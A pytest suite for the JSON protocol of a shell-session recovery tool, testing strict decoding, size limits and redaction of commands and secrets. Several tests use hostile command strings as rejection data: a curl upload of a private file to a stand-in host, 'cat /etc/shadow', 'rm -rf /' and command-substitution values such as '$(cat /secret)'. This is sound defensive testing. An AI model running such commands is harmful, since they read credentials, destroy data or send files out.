import json
import random
from collections.abc import Sequence
from dataclasses import replace

import pytest

from termrecall.model import (
    CommandDisposition,
    CommandRecord,
    OutcomeKind,
    ProcessIdentity,
    RestorationLevel,
)
from termrecall.protocol import (
    ERROR_MESSAGES,
    FALLBACK_ERROR_BYTES,
    MAX_COMMAND_CHARS,
    MAX_DIAGNOSTIC_CHARS,
    MAX_ERROR_MESSAGE_CHARS,
    MAX_ID_CHARS,
    MAX_ITEMS,
    MAX_LOCAL_FRAME_BYTES,
    MAX_MESSAGE_BYTES,
    MAX_OUTCOME_MESSAGE_CHARS,
    MAX_PATH_CHARS,
    MAX_RESPONSE_BYTES,
    REQUEST_DECODERS,
    DecodedReplayDisplay,
    DiscardRequest,
    DiscardResponse,
    ErrorCode,
    ErrorResponse,
    EventRequest,
    EventResponse,
    EventType,
    LocalEvent,
    Operation,
    OutcomeView,
    ProtocolError,
    RecoveryItemView,
    RegisterRequest,
    RegisterResponse,
    RedactedDisplay,
    ResponseEncodingError,
    SafeExternalText,
    RestoreExecuteRequest,
    RestoreListRequest,
    RestoreListResponse,
    RestoreResultResponse,
    RestoreRetryRequest,
    SnapshotRequest,
    SnapshotResponse,
    StatusRequest,
    StatusResponse,
    decode_local_frame,
    decode_request,
    decode_response,
    encode_local_frame,
    encode_request,
    encode_response,
)

IDENTITY = ProcessIdentity("11111111-1111-1111-1111-111111111111", 9, 10)
SHELL_ID = "shell-aaaaaaaaaaa"
CAPABILITY = "a" * 43


def json_line(value: object) -> bytes:
    return json.dumps(value, separators=(",", ":")).encode() + b"\n"


def wire(**updates: object) -> bytes:
    value = {
        "schema_version": 1,
        "operation": "prompt_ready",
        "shell_id": SHELL_ID,
        "capability": CAPABILITY,
        "identity": {"boot_id": IDENTITY.boot_id, "pid": 9, "start_time": 10},
        "sequence": 2,
        "cwd": "/srv/app",
    }
    value.update(updates)
    return json_line(value)


def test_decode_valid_event() -> None:
    assert isinstance(decode_request(wire()), EventRequest)


@pytest.mark.parametrize("raw", [b"", b"[]\n", b"{}\n", b"{broken\n", b"{} trailing\n", b"{}\n\n"])
def test_malformed_requests_are_rejected(raw: bytes) -> None:
    with pytest.raises(ValueError):
        decode_request(raw)


def test_oversized_request_is_rejected_before_json_decode() -> None:
    with pytest.raises(ValueError, match="message exceeds"):
        decode_request(b"x" * (MAX_MESSAGE_BYTES + 1))


def test_random_malformed_bytes_never_escape_as_non_value_error() -> None:
    random.seed(4)
    for _ in range(500):
        raw = random.randbytes(random.randrange(0, 256))
        try:
            decode_request(raw)
        except ValueError:
            pass


@pytest.mark.parametrize("decoder", [decode_request, decode_response, decode_local_frame])
def test_decoders_reject_excessive_json_nesting(decoder: object) -> None:
    raw = (b'{"nested":' * 40) + b"null" + (b"}" * 40) + b"\n"
    with pytest.raises(ValueError, match="nesting"):
        decoder(raw)  # type: ignore[operator]


@pytest.mark.parametrize("decoder", [decode_request, decode_response, decode_local_frame])
def test_decoders_normalize_json_recursion_errors(
    decoder: object, monkeypatch: pytest.MonkeyPatch
) -> None:
    def recurse(*args: object, **kwargs: object) -> object:
        raise RecursionError("parser recursion")

    monkeypatch.setattr(json, "loads", recurse)
    with pytest.raises(ValueError, match="invalid .* JSON"):
        decoder(b"{}\n")  # type: ignore[operator]


LOCAL_EVENTS = (
    LocalEvent(EventType.COMMAND_STARTED, SHELL_ID, command_sequence=1, command="pwd"),
    LocalEvent(EventType.COMMAND_FINISHED, SHELL_ID, command_sequence=1, exit_status=0),
    LocalEvent(EventType.PROMPT_READY, SHELL_ID, cwd="/srv/app"),
    LocalEvent(EventType.CWD_CHANGED, SHELL_ID, cwd="/tmp"),
    LocalEvent(EventType.EXPLICIT_EXIT, SHELL_ID),
)


@pytest.mark.parametrize("event", LOCAL_EVENTS)
def test_local_event_round_trip_has_only_event_specific_keys(event: LocalEvent) -> None:
    raw = encode_local_frame(event)
    assert decode_local_frame(raw) == event
    payload = json.loads(raw)
    assert "operation" not in payload
    assert not ({"capability", "identity", "sequence"} & set(payload))
    assert raw.endswith(b"\n") and raw.count(b"\n") == 1
    assert len(raw) <= MAX_LOCAL_FRAME_BYTES


REQUESTS = (
    RegisterRequest(SHELL_ID, IDENTITY, "gnome-terminal", "/srv/app", 0),
    EventRequest(Operation.COMMAND_STARTED, SHELL_ID, CAPABILITY, IDENTITY, 1, command_sequence=1, command="pwd"),
    EventRequest(Operation.COMMAND_FINISHED, SHELL_ID, CAPABILITY, IDENTITY, 2, command_sequence=1, exit_status=0),
    EventRequest(Operation.PROMPT_READY, SHELL_ID, CAPABILITY, IDENTITY, 3, cwd="/srv/app"),
    EventRequest(Operation.CWD_CHANGED, SHELL_ID, CAPABILITY, IDENTITY, 4, cwd="/tmp"),
    EventRequest(Operation.EXPLICIT_EXIT, SHELL_ID, CAPABILITY, IDENTITY, 5),
    StatusRequest(), SnapshotRequest(), RestoreListRequest(),
    RestoreListRequest("workspace-a", "attempt-a"),
    RestoreExecuteRequest("workspace-a", ("item-a",), ("item-a",)),
    RestoreRetryRequest("workspace-a", "attempt-a", ("item-a",)),
    DiscardRequest("workspace-a", True),
)


@pytest.mark.parametrize("request_value", REQUESTS)
def test_every_request_round_trips_canonically(request_value: object) -> None:
    raw = encode_request(request_value)  # type: ignore[arg-type]
    assert decode_request(raw) == request_value
    assert raw.endswith(b"\n") and raw.count(b"\n") == 1
    assert b" " not in raw and len(raw) <= MAX_MESSAGE_BYTES
    assert "type" not in json.loads(raw)


def test_unfiltered_restore_list_preserves_original_exact_wire_schema() -> None:
    assert encode_request(RestoreListRequest()) == b'{"schema_version":1,"operation":"restore_list"}\n'


def test_filtered_restore_list_requires_workspace_and_attempt_together() -> None:
    with pytest.raises(ValueError):
        encode_request(RestoreListRequest("workspace-a", None))
    with pytest.raises(ValueError):
        encode_request(RestoreListRequest(None, "attempt-a"))


def test_request_decoder_table_is_exhaustive() -> None:
    assert set(REQUEST_DECODERS) == set(Operation)


@pytest.mark.parametrize("request_value", REQUESTS)
def test_every_request_rejects_missing_and_unknown_keys(request_value: object) -> None:
    payload = json.loads(encode_request(request_value))  # type: ignore[arg-type]
    for key in tuple(payload):
        missing = dict(payload); del missing[key]
        with pytest.raises(ValueError):
            decode_request(json_line(missing))
    payload["unknown"] = 1
    with pytest.raises(ValueError, match="unknown"):
        decode_request(json_line(payload))


def test_duplicate_keys_at_nested_depth_are_rejected() -> None:
    raw = wire(identity={"boot_id": IDENTITY.boot_id, "pid": 9, "pid": 9, "start_time": 10})
    # A literal is needed because Python dictionaries cannot retain duplicates.
    raw = raw.replace(b'"pid":9,"start_time"', b'"pid":9,"pid":9,"start_time"')
    with pytest.raises(ValueError, match="invalid request JSON"):
        decode_request(raw)


@pytest.mark.parametrize("updates", [
    {"sequence": True}, {"sequence": 0}, {"cwd": "relative"},
    {"shell_id": "short"}, {"capability": "a" * 31},
    {"identity": {"boot_id": "AAAAAAAA-AAAA-AAAA-AAAA-AAAAAAAAAAAA", "pid": 9, "start_time": 10}},
    {"identity": {"boot_id": IDENTITY.boot_id, "pid": True, "start_time": 10}},
    {"identity": {"boot_id": IDENTITY.boot_id, "pid": 2**31, "start_time": 10}},
    {"identity": {"boot_id": IDENTITY.boot_id, "pid": 9, "start_time": 2**63}},
])
def test_lifecycle_type_and_bound_violations_are_rejected(updates: dict[str, object]) -> None:
    with pytest.raises(ValueError):
        decode_request(wire(**updates))


def test_event_specific_bounds_are_enforced() -> None:
    started = json.loads(encode_request(REQUESTS[1])); started["command"] = "x" * (MAX_COMMAND_CHARS + 1)
    finished = json.loads(encode_request(REQUESTS[2])); finished["exit_status"] = 256
    for payload in (started, finished):
        with pytest.raises(ValueError): decode_request(json_line(payload))


@pytest.mark.parametrize("payload", [
    {"schema_version": 1, "operation": "restore_execute", "workspace_id": "w", "selected_item_ids": [], "approved_item_ids": []},
    {"schema_version": 1, "operation": "restore_execute", "workspace_id": "w", "selected_item_ids": ["a", "a"], "approved_item_ids": []},
    {"schema_version": 1, "operation": "restore_execute", "workspace_id": "w", "selected_item_ids": ["a"], "approved_item_ids": ["b"]},
    {"schema_version": 1, "operation": "restore_retry", "workspace_id": "w", "attempt_id": "a", "approved_item_ids": [], "selected_item_ids": []},
    {"schema_version": 1, "operation": "discard", "workspace_id": "w", "confirm": False},
    {"schema_version": 1, "operation": "discard", "workspace_id": "w", "confirm": 1},
])
def test_restore_request_invariants(payload: dict[str, object]) -> None:
    with pytest.raises(ValueError): decode_request(json_line(payload))


def test_registration_and_controls_reject_cross_schema_fields() -> None:
    register = json.loads(encode_request(REQUESTS[0])); register["capability"] = CAPABILITY
    control = {"schema_version": 1, "operation": "status", "sequence": 1}
    for payload in (register, control):
        with pytest.raises(ValueError): decode_request(json_line(payload))


@pytest.mark.parametrize(
    "adapter", ["gnome-terminal", "kitty", "xfce4-terminal", "konsole"]
)
def test_register_request_decodes_each_supported_adapter(adapter: str) -> None:
    payload = {
        "schema_version": 1,
        "operation": "register",
        "shell_id": SHELL_ID,
        "identity": {"boot_id": IDENTITY.boot_id, "pid": 9, "start_time": 10},
        "adapter": adapter,
        "cwd": "/srv/app",
        "sequence": 0,
    }
    decoded = decode_request(json_line(payload))
    assert isinstance(decoded, RegisterRequest)
    assert decoded.adapter == adapter
    assert decode_request(encode_request(decoded)) == decoded


@pytest.mark.parametrize("adapter", ["wezterm", "alacritty", "", "gnome-terminal "])
def test_register_request_rejects_unsupported_adapter(adapter: object) -> None:
    payload = {
        "schema_version": 1,
        "operation": "register",
        "shell_id": SHELL_ID,
        "identity": {"boot_id": IDENTITY.boot_id, "pid": 9, "start_time": 10},
        "adapter": adapter,
        "cwd": "/srv/app",
        "sequence": 0,
    }
    with pytest.raises(ValueError):
        decode_request(json_line(payload))


ITEM = RecoveryItemView("item-a", SHELL_ID, SafeExternalText.catalog("prior_boot"), RestorationLevel.PARTIAL, "/srv/app", None, RedactedDisplay.from_command_record(CommandRecord(1, "python3 -m http.server 8000", "python3 -m http.server 8000", CommandDisposition.REPLAYABLE, True)), True)
OUTCOME = OutcomeView("item-a", OutcomeKind.SUCCESS, SafeExternalText.catalog("restored"))
RESPONSES = (
    RegisterResponse(CAPABILITY), EventResponse(2),
    StatusResponse(True, 1, 3, 2, False, False, None, 1, (SafeExternalText.catalog("healthy"),)),
    SnapshotResponse(2), RestoreListResponse("workspace-a", (ITEM,), (SafeExternalText.catalog("partial"),)),
    RestoreListResponse(None, (), ()),
    RestoreResultResponse("workspace-a", "attempt-a", (OUTCOME,), ()),
    DiscardResponse("workspace-a", True),
    ErrorResponse(ProtocolError(ErrorCode.INVALID_REQUEST, ERROR_MESSAGES[ErrorCode.INVALID_REQUEST])),
)


@pytest.mark.parametrize("response", RESPONSES)
def test_every_response_round_trips_canonically(response: object) -> None:
    raw = encode_response(response)  # type: ignore[arg-type]
    decoded = decode_response(raw)
    if isinstance(response, RestoreListResponse) and response.items:
        assert isinstance(decoded, RestoreListResponse)
        assert decoded.workspace_id == response.workspace_id
        assert decoded.diagnostics == response.diagnostics
        assert replace(decoded.items[0], replay_display=response.items[0].replay_display) == response.items[0]
    else:
        assert decoded == response
    assert raw.endswith(b"\n") and raw.count(b"\n") == 1
    assert len(raw) <= MAX_RESPONSE_BYTES
    assert b": " not in raw and b", " not in raw


@pytest.mark.parametrize("response", RESPONSES)
def test_every_response_rejects_missing_and_unknown_keys(response: object) -> None:
    payload = json.loads(encode_response(response))  # type: ignore[arg-type]
    for key in tuple(payload):
        missing = dict(payload); del missing[key]
        with pytest.raises(ValueError): decode_response(json_line(missing))
    payload["unknown"] = 1
    with pytest.raises(ValueError): decode_response(json_line(payload))


@pytest.mark.parametrize("code", list(ErrorCode))
def test_fixed_error_map_is_the_only_accepted_wire_message(code: ErrorCode) -> None:
    response = ErrorResponse(ProtocolError(code, ERROR_MESSAGES[code]))
    assert decode_response(encode_response(response)) == response
    payload = json.loads(encode_response(response)); payload["error"]["message"] = "other"
    with pytest.raises(ValueError): decode_response(json_line(payload))


def test_response_bounds_and_strict_primitives_are_enforced() -> None:
    invalid = (
        replace(RESPONSES[2], registered_shells=True),
        replace(RESPONSES[2], last_error="x" * (MAX_ERROR_MESSAGE_CHARS + 1)),
        replace(RESPONSES[2], diagnostics=("x" * (MAX_DIAGNOSTIC_CHARS + 1),)),
        RestoreResultResponse("workspace-a", "attempt-a", (replace(OUTCOME, message="x" * (MAX_OUTCOME_MESSAGE_CHARS + 1)),), ()),
        RestoreListResponse("workspace-a", (replace(ITEM, directory="/" + "x" * MAX_PATH_CHARS),), ()),
    )
    for response in invalid:
        with pytest.raises(ResponseEncodingError): encode_response(response)  # type: ignore[arg-type]


class OverLimitSequence(Sequence[object]):
    def __len__(self) -> int:
        return MAX_ITEMS + 1

    def __iter__(self) -> object:
        raise AssertionError("over-limit collection must not be iterated")

    def __getitem__(self, index: int) -> object:
        raise AssertionError("over-limit collection must not be indexed")


@pytest.mark.parametrize(
    "response",
    [
        StatusResponse(True, 0, 0, 0, False, False, None, 0, OverLimitSequence()),
        RestoreListResponse("workspace-a", OverLimitSequence(), ()),
        RestoreListResponse(None, (), OverLimitSequence()),
        RestoreResultResponse("workspace-a", "attempt-a", OverLimitSequence(), ()),
        RestoreResultResponse("workspace-a", "attempt-a", (), OverLimitSequence()),
    ],
)
def test_typed_response_collections_reject_over_limit_before_iteration(response: object) -> None:
    with pytest.raises(ResponseEncodingError):
        encode_response(response)  # type: ignore[arg-type]


def test_typed_request_collections_reject_over_limit_before_iteration() -> None:
    requests = (
        RestoreExecuteRequest("workspace-a", OverLimitSequence(), ()),
        RestoreExecuteRequest("workspace-a", ("item-a",), OverLimitSequence()),
        RestoreRetryRequest("workspace-a", "attempt-a", OverLimitSequence()),
    )
    for request_value in requests:
        with pytest.raises(ValueError):
            encode_request(request_value)


def test_typed_collections_reject_wrong_container_and_element_types() -> None:
    with pytest.raises(ValueError):
        encode_request(RestoreExecuteRequest("workspace-a", "item-a", ()))
    with pytest.raises(ResponseEncodingError):
        encode_response(StatusResponse(True, 0, 0, 0, False, False, None, 0, "diagnostic"))
    with pytest.raises(ResponseEncodingError):
        encode_response(RestoreListResponse("workspace-a", (object(),), ()))


def test_response_item_collections_are_bounded_unique_and_consistent() -> None:
    duplicate_items = RestoreListResponse("workspace-a", (ITEM, ITEM), ())
    duplicate_outcomes = RestoreResultResponse("workspace-a", "attempt-a", (OUTCOME, OUTCOME), ())
    too_many = StatusResponse(True, 0, 0, 0, False, False, None, 0, (SafeExternalText.catalog("healthy"),) * (MAX_ITEMS + 1))
    inconsistent = RestoreListResponse(None, (ITEM,), ())
    for response in (duplicate_items, duplicate_outcomes, too_many, inconsistent):
        with pytest.raises(ResponseEncodingError): encode_response(response)


def test_arbitrary_plain_strings_have_no_external_response_provenance() -> None:
    arbitrary = (
        "curl https://example.invalid/upload --data @private.txt",
        "Traceback at worker.py line 91: database connection failed",
    )
    for text in arbitrary:
        responses = (
            replace(RESPONSES[2], last_error=text),
            replace(RESPONSES[2], diagnostics=(text,)),
            RestoreListResponse("workspace-a", (replace(ITEM, reason=text),), ()),
            RestoreListResponse("workspace-a", (replace(ITEM, directory_warning=text),), ()),
            RestoreResultResponse("workspace-a", "attempt-a", (replace(OUTCOME, message=text),), ()),
        )
        for response in responses:
            with pytest.raises(ResponseEncodingError):
                encode_response(response)


def test_catalog_text_and_redacted_display_encode_as_plain_json_strings() -> None:
    diagnostic = SafeExternalText.catalog("healthy")
    reason = SafeExternalText.catalog("prior_boot")
    warning = SafeExternalText.sanitize("/private/original/path")
    outcome = SafeExternalText.catalog("restored")
    display = RedactedDisplay.from_command_record(CommandRecord(1, "python3 -m http.server 8000", "python3 -m http.server 8000", CommandDisposition.REPLAYABLE, True))
    response = RestoreListResponse(
        "workspace-a",
        (replace(ITEM, reason=reason, directory_warning=warning, replay_display=display),),
        (diagnostic,),
    )
    payload = json.loads(encode_response(response))
    assert payload["diagnostics"] == ["healthy"]
    assert payload["items"][0]["reason"] == "prior_boot"
    assert payload["items"][0]["directory_warning"] == "details unavailable"
    assert payload["items"][0]["replay_display"] == "python3 -m http.server 8000"

    result = RestoreResultResponse(
        "workspace-a", "attempt-a", (replace(OUTCOME, message=outcome),), ()
    )
    assert json.loads(encode_response(result))["outcomes"][0]["message"] == "restored"


def test_safe_external_text_has_closed_constructors() -> None:
    with pytest.raises(TypeError):
        SafeExternalText("arbitrary")  # type: ignore[call-arg]
    with pytest.raises(ValueError):
        SafeExternalText.catalog("not in catalog")
    assert SafeExternalText.sanitize(RuntimeError("raw exception")).value == "details unavailable"


def classified_command(
    display: str = "python3 -m http.server 8000",
    disposition: CommandDisposition = CommandDisposition.REPLAYABLE,
    executable: str | None = "python3 -m http.server 8000",
    active: bool = True,
) -> CommandRecord:
    return CommandRecord(1, display, executable, disposition, active)


def test_redacted_display_requires_an_accepted_command_record() -> None:
    display = RedactedDisplay.from_command_record(classified_command())
    assert display.value == "python3 -m http.server 8000"
    with pytest.raises(TypeError):
        RedactedDisplay("pwd")  # type: ignore[call-arg]
    assert not hasattr(RedactedDisplay, "from_classifier")


@pytest.mark.parametrize("display", ["cat /etc/shadow", "rm -rf /", "cat /private/file"])
def test_raw_command_strings_cannot_mint_or_encode_display(display: str) -> None:
    with pytest.raises(TypeError):
        RedactedDisplay.from_command_record(display)  # type: ignore[arg-type]
    response = RestoreListResponse("workspace-a", (replace(ITEM, replay_display=display),), ())
    with pytest.raises(ResponseEncodingError):
        encode_response(response)


@pytest.mark.parametrize(
    "record",
    [
        classified_command("redacted", CommandDisposition.REDACTED, None, False),
        classified_command("unsafe", CommandDisposition.UNSAFE, None, False),
        classified_command("unrepresentable", CommandDisposition.UNREPRESENTABLE, None, False),
        classified_command("cat /etc/shadow", CommandDisposition.REPLAYABLE, "cat /etc/shadow"),
        classified_command("rm -rf /", CommandDisposition.REPLAYABLE, "rm -rf /"),
        classified_command("x" * (MAX_DIAGNOSTIC_CHARS + 1)),
    ],
)
def test_non_safe_command_records_cannot_mint_display(record: CommandRecord) -> None:
    with pytest.raises(ValueError):
        RedactedDisplay.from_command_record(record)


@pytest.mark.parametrize(
    "command",
    [
        "sudo apt update",
        "eval date",
        "curl -H 'Authorization: Bearer forged-value' https://example.test",
        "rm -rf /tmp/app",
    ],
)
def test_forged_replayable_command_record_is_reclassified_and_rejected(command: str) -> None:
    forged = CommandRecord(7, command, command, CommandDisposition.REPLAYABLE, True)
    with pytest.raises(ValueError):
        RedactedDisplay.from_command_record(forged)


def test_actual_classifier_output_can_mint_replay_display() -> None:
    from termrecall.classifier import classify_command

    classified = classify_command("python3 -m http.server 8000", 7).record
    display = RedactedDisplay.from_command_record(classified)
    assert display.value == classified.display


def test_decoded_replay_display_is_untrusted_and_cannot_be_reencoded() -> None:
    raw = encode_response(RestoreListResponse("workspace-a", (ITEM,), ()))
    decoded = decode_response(raw)
    assert isinstance(decoded, RestoreListResponse)
    assert isinstance(decoded.items[0].replay_display, DecodedReplayDisplay)
    with pytest.raises(ResponseEncodingError):
        encode_response(decoded)


def test_decoder_never_mints_encoder_provenance_from_matching_wire_text() -> None:
    payload = json.loads(encode_response(RestoreListResponse("workspace-a", (ITEM,), ())))
    payload["items"][0]["replay_display"] = "cat /etc/shadow"
    decoded = decode_response(json_line(payload))
    assert isinstance(decoded, RestoreListResponse)
    assert isinstance(decoded.items[0].replay_display, DecodedReplayDisplay)
    with pytest.raises(ResponseEncodingError):
        encode_response(decoded)


def test_non_register_responses_are_command_and_capability_free() -> None:
    sentinels = (b'"command"', b'"approved_command"', b'"argv"', b'"executable"', b'"capability"', b"SECRET_SENTINEL")
    for response in RESPONSES[1:]:
        raw = encode_response(response)
        assert not any(sentinel in raw for sentinel in sentinels)


@pytest.mark.parametrize(
    "response",
    [
        replace(RESPONSES[2], last_error="SECRET_SENTINEL"),
        replace(RESPONSES[2], diagnostics=("command SENTINEL",)),
        RestoreListResponse("workspace-a", (replace(ITEM, reason="capability SENTINEL"),), ()),
        RestoreListResponse("workspace-a", (replace(ITEM, directory_warning="exception SENTINEL"),), ()),
        RestoreListResponse("workspace-a", (replace(ITEM, replay_display="secret SENTINEL"),), ()),
        RestoreResultResponse(
            "workspace-a", "attempt-a", (replace(OUTCOME, message="command SENTINEL"),), ()
        ),
        ErrorResponse(ProtocolError(ErrorCode.INVALID_REQUEST, "exception SENTINEL")),
    ],
)
def test_every_externally_visible_free_form_field_rejects_sensitive_text(response: object) -> None:
    with pytest.raises(ResponseEncodingError):
        encode_response(response)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    "display",
    ["python -V; cat /secret", "$(cat /secret)", "token=SECRET", "capability=abc"],
)
def test_replay_display_requires_explicitly_safe_redacted_text(display: str) -> None:
    response = RestoreListResponse("workspace-a", (replace(ITEM, replay_display=display),), ())
    with pytest.raises(ResponseEncodingError):
        encode_response(response)


def test_response_decoder_rejects_sensitive_free_form_text() -> None:
    payload = json.loads(encode_response(RESPONSES[2]))
    payload["diagnostics"] = ["SECRET_SENTINEL"]
    with pytest.raises(ValueError):
        decode_response(json_line(payload))


def test_response_encoder_uses_specific_error_and_bounded_fallback() -> None:
    with pytest.raises(ResponseEncodingError): encode_response(object())  # type: ignore[arg-type]
    assert decode_response(FALLBACK_ERROR_BYTES) == ErrorResponse(
        ProtocolError(ErrorCode.INTERNAL_ERROR, ERROR_MESSAGES[ErrorCode.INTERNAL_ERROR])
    )
    assert len(FALLBACK_ERROR_BYTES) <= MAX_RESPONSE_BYTES


def test_documented_constant_values() -> None:
    assert (MAX_MESSAGE_BYTES, MAX_RESPONSE_BYTES, MAX_LOCAL_FRAME_BYTES) == (16_384, 16_384, 4_096)
    assert (MAX_COMMAND_CHARS, MAX_PATH_CHARS, MAX_ID_CHARS, MAX_ITEMS) == (3_072, 768, 128, 256)
